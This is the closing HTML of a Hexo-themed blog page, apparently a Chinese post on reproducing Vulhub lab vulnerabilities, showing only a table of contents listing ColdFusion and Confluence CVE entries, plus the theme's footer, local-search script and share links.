href="#%E5%A4%8D%E7%8E%B0-4"><span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Adobe-ColdFusion-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2010-2861%EF%BC%89"><span class="toc-text">Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0-5"><span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Adobe-ColdFusion-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-3066%EF%BC%89"><span class="toc-text">Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Atlassian-Confluence-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-3396%EF%BC%89"><span class="toc-text">Atlassian Confluence 路径穿越与命令执行漏洞（CVE-2019-3396）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA-2"><span class="toc-text">靶场</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0-6"><span class="toc-text">复现</span></a></li></ol></li></ol></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        







      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + vulhub%E5%A4%8D%E7%8E%B0 + '&url=' + http%3A%2F%2Fsovohelp.fit%2F2023%2F01%2F02%2Fvulhub%25E5%25A4%258D%25E7%258E%25B0%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://sovohelp.fit/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
